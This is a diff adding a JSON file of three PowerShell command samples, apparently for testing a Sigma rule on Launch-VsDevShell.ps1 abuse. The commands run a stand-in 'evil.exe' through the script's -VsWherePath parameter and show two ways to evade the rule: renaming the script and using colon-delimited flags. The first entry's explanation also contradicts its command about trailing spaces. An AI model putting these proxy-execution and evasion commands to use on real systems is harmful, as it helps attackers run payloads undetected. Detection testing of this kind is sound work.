@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -File \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1\" -VsWherePath\"C:\\Windows\\Temp\\evil.exe\" -VsInstallationPath \"C:\\\"",
+    "explanation": "This command likely triggers the rule because it contains the script name and both required flag strings ('VsWherePath ' and 'VsInstallationPath ') with the expected trailing spaces."
+  },
+  {
+    "output": "copy \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1\" \"C:\\Users\\Public\\Update.ps1\"; powershell.exe -File \"C:\\Users\\Public\\Update.ps1\" -VsWherePath \"C:\\Windows\\Temp\\evil.exe\" -VsInstallationPath \"C:\\\"",
+    "explanation": "Bypass via Renaming: The Sigma rule's 'selection_script' logic specifically looks for the string 'Launch-VsDevShell.ps1'. By copying the script to a new name, the command line no longer contains the original filename, effectively evading the primary detection filter while maintaining the script's functionality."
+  },
+  {
+    "output": "powershell.exe -File \"C:\\..\\Tools\\Launch-VsDevShell.ps1\" -VsWherePath:\"C:\\evil.exe\" -VsInstallationPath:\"C:\\\"",
+    "explanation": "Bypass via Character Substitution: The rule checks for the flags 'VsWherePath ' and 'VsInstallationPath ' including a trailing space. PowerShell parameters can often be delimited by colons (:) or handled without a trailing space if nested in quotes or expressions, which prevents the 'selection_flags' logic from matching."
+  }
+]
